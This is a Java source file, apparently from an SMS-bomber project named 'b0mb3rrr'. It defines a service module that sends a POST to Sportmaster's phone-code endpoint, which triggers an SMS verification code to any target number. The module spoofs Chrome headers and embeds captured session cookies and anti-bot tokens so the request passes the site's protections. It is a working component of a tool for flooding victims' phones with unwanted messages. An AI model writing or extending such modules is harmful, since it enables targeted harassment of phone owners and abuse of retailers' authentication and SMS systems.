package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Sportmaster extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        return new Request.Builder()
                .url("https://www.sportmaster.ru/web-api/v1/auth/phone/codes/")
                .post(RequestBody.create(STR."{\"phone\":\"\{phone.phone()}\",\"typeChannel\":\"SMS\"}", MediaType.parse("application/json; charset=utf-8")))
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "en-US,en;q=0.9,ru;q=0.8")
                .header("content-type", "application/json")
                .header("cookie", "qrator_jsr=1712856189.059.K2d8Esz6dBk2RoiS-v3i3pg979lhaehtqv23ss4e0nk25656s-00; qrator_ssid=1712856190.158.zoyNRehafbZTsTAI-amg5r8vool7lps235tq6no97625idiu6; qrator_jsid=1712856189.059.K2d8Esz6dBk2RoiS-j0j3nlnivdpmccv19o27mgi2fpq7585l; UDID=2138809e-bc3a-4d63-95b1-7a36e962e716; SMID=eyJhbGciOiJSUzI1NiJ9.eyJqdGkiOiJiMDAyZGI2ZC01YmU0LTQ3YmEtODRkMi04NjZiNjk1YTI4ZWEiLCJpc3MiOiJTTTMwIiwiaWF0IjoxNzEyODU2MTkwLCJ2IjoiVjIiLCJhdWQiOlsic3BvcnRtYXN0ZXIiXSwiYW5UIjoiMTBjMzZmNzgtODM1Yy00MWRlLWIyZDQtNDQ3OTZlMmE1OTk5IiwiYW5QIjoiNmNiMWVkMzYtMTQ0Yi00Yjk4LTgzMDAtOGYxZTJkZmVmYWU5IiwiYW5VIjoiMTAwMDAwMDExMDQxMDg3ODIyIiwiY2FuVCI6IkFJQUFCSVhKY0FIdm5meUFPNHNXVGJTYjJMWUxvNmMreHl0dndXanNHcXRCZW51TEJnbTM2bjNXbGVROHEyQ2hNb2NUSEhYU01YNlJpaVRCWStnYkRFWnd1dFZHS2VOUUVUbXlaMGpnQkRZZ0hTWEEwQTFiQ3o2d0JDUlk5UUtHNUJtRDc2bEFPbElReHB6YThWSlBYR3RmTlpyV0QvWXk0WHlHS0tPc2hWSzc4ZEZKZ3k1alpoby9neFJVc2crcFJTRnBCUzBYMDd4UW9jNnVqZ2N6RFZnOGRhR0Y1bHJGczVhejhQVXJsNnBJaEo5ZDliUGdBSG9KTnkvUkppbjJIQzg9IiwiY2FuUCI6IkFJQlN2Y2VUMXFpZVFxRkJRZm5Pam1mVHNya3ExNmFUSy9tVktHNHBDM05WMDNXRFhzU2ZaYzJYVDNneU4wR3lCSUs3dkZqYXpSdno2cnFIQjYrTW41Tlo1WkV3WVN0Z1FvampGL1JDTEtYbzZIM1Qwd1pJdFFiS0NGOGRKVWlZSk1qYUF0RXF0SnU3SzFDcGkvWUluV1JPNy9Oc243bTBpV1doUmljMHpwcWxULzF5QmpXMnFOYWlHZldEb0RSSnNsNDZLOWovUmxFTFNic0JoLzVRZkZjQ2lGRHYxRXA5NFNzaDdnVU5oNUxwYnk2dnh5cXA2RWd2Y1VpcUM0SGxIY2s9In0.KR3X1hcwZnjBmv6CbkP4Loxcm63ps-UmjhOwsLW_EBCgZEocruuXeb1OvQ0DtAujsf9q2t8V6InZO472ma0ZNQg0KBnCqXjor3cPe3oqFjaECkqDstGEVKdU63kVB91v2RXpI52roA2Uywzg_QmuGrz2YMCON0aDCAhJXrJhrRHvyk-7FOKgF1FxyQDnLbnzUd5OVXxHJy-4kdCruNedooMFZtowHk7UIfKb5vCYe_hdzAK74Wh7OnKCxjADW5FsRtksfVkgYug7gKrOikNYHDmsHnMPI3m4pQ10zbIWLvQ_Suqril4mu4FzXzgY3gVjtU809TiBL5FWJNqZvkcMZA; SMAID=6cb1ed36-144b-4b98-8300-8f1e2dfefae9; __zzatw-sportm=MDA0dBA=Fz2+aQ==; __zzatw-sportm=MDA0dBA=Fz2+aQ==; SMAUTH=eyJpZCI6IjZjYjFlZDM2LTE0NGItNGI5OC04MzAwLThmMWUyZGZlZmFlOSIsInN0IjoiTkVXIiwidG0iOjE3MTI4NTYxOTJ9; userAuth=0; spcount=1; _ga_Z7E27793QJ=GS1.1.1712856193.1.0.1712856193.60.0.0; st_uid=cd1f88c6b40fbf8d9fd752fea8b06c26; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=eb977aca-2bcc-4386-ba9f-fc1556588cd0; _ga=GA1.2.1627257973.1712856193; _gid=GA1.2.977300481.1712856194; _dc_gtm_UA-3450216-4=1; tmr_lvid=c20eb318d1456027d7df01c93cc6c3cc; tmr_lvidTS=1712856193765; uxs_uid=2d54b350-f828-11ee-833f-3f496e0e6822; _ym_uid=1712856194742688082; _ym_d=1712856194; _ym_isad=2; _ym_visorc=w; domain_sid=5YjFH71SdPJCRgBOREYii%3A1712856194719; adrdel=1; adrcid=AIEvUCsYhunM4M-u0wBuWqw; tmr_detect=0%7C1712856197759; gsscw-sportm=kQdl1M/XC3UpXBuHMtzHgrPMvn/cwULsj14ke/vu9vfCB01DHF9vx4siPqgBTnX1sGwhnSkAcrHmL+DKDvBr6f+MKgI/kkA72DNgz52W3DaKGSZTKVGY6143E8ue3nwqabDGK4Z9n1KfoSzsy5bWy18z7I3j4xVnBzQIKSqHJ3ubToiK4g6bEWUfmiTNF0SBTcHje1UT3hK2zSUcKIpX2adaxELU5Hx3uUslqZisiTde7dfVaBuKxSJuneVYAoGQre6FFVM=; cfidsw-sportm=6/6xoT+XM06F5Z0mvhcd8zdQqWdzfvrsAJlePlY5NzCm0ih2vnptkyC0DeFCaHkAycVtgG+W1VH4fyqRyh0cTpj2zjUheavQtNwijNOzhLTmOAbxHbfp7uycLRD5/t7uTJnTTb3f4YLLVyQfR23ysFAO4gQJ1XprbSLG; cfidsw-sportm=6/6xoT+XM06F5Z0mvhcd8zdQqWdzfvrsAJlePlY5NzCm0ih2vnptkyC0DeFCaHkAycVtgG+W1VH4fyqRyh0cTpj2zjUheavQtNwijNOzhLTmOAbxHbfp7uycLRD5/t7uTJnTTb3f4YLLVyQfR23ysFAO4gQJ1XprbSLG; cfidsw-sportm=6/6xoT+XM06F5Z0mvhcd8zdQqWdzfvrsAJlePlY5NzCm0ih2vnptkyC0DeFCaHkAycVtgG+W1VH4fyqRyh0cTpj2zjUheavQtNwijNOzhLTmOAbxHbfp7uycLRD5/t7uTJnTTb3f4YLLVyQfR23ysFAO4gQJ1XprbSLG; gsscw-sportm=kQdl1M/XC3UpXBuHMtzHgrPMvn/cwULsj14ke/vu9vfCB01DHF9vx4siPqgBTnX1sGwhnSkAcrHmL+DKDvBr6f+MKgI/kkA72DNgz52W3DaKGSZTKVGY6143E8ue3nwqabDGK4Z9n1KfoSzsy5bWy18z7I3j4xVnBzQIKSqHJ3ubToiK4g6bEWUfmiTNF0SBTcHje1UT3hK2zSUcKIpX2adaxELU5Hx3uUslqZisiTde7dfVaBuKxSJuneVYAoGQre6FFVM=; gsscw-sportm=kQdl1M/XC3UpXBuHMtzHgrPMvn/cwULsj14ke/vu9vfCB01DHF9vx4siPqgBTnX1sGwhnSkAcrHmL+DKDvBr6f+MKgI/kkA72DNgz52W3DaKGSZTKVGY6143E8ue3nwqabDGK4Z9n1KfoSzsy5bWy18z7I3j4xVnBzQIKSqHJ3ubToiK4g6bEWUfmiTNF0SBTcHje1UT3hK2zSUcKIpX2adaxELU5Hx3uUslqZisiTde7dfVaBuKxSJuneVYAoGQre6FFVM=; fgsscw-sportm=fIZb29fefde8c5249474f55a26afb909ebba3021; fgsscw-sportm=fIZb29fefde8c5249474f55a26afb909ebba3021")
                .header("origin", "https://www.sportmaster.ru")
                .header("referer", "https://www.sportmaster.ru/user/session/sendSmsCode.do/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
                .header("x-gib-fgsscw-sportm", "fIZb29fefde8c5249474f55a26afb909ebba3021")
                .header("x-gib-gsscw-sportm", "kQdl1M/XC3UpXBuHMtzHgrPMvn/cwULsj14ke/vu9vfCB01DHF9vx4siPqgBTnX1sGwhnSkAcrHmL+DKDvBr6f+MKgI/kkA72DNgz52W3DaKGSZTKVGY6143E8ue3nwqabDGK4Z9n1KfoSzsy5bWy18z7I3j4xVnBzQIKSqHJ3ubToiK4g6bEWUfmiTNF0SBTcHje1UT3hK2zSUcKIpX2adaxELU5Hx3uUslqZisiTde7dfVaBuKxSJuneVYAoGQre6FFVM=")
                .header("x-sm-accept-language", "ru-RU")
                .header("x-sm-request-id", "0f26a87c-b4b5")
                .header("x-sm-tracing-id", "c4c5dfe9-3787310")
                ;
    }

    @Override
    public String getServiceName() {
        return "Sportmaster";
    }
}
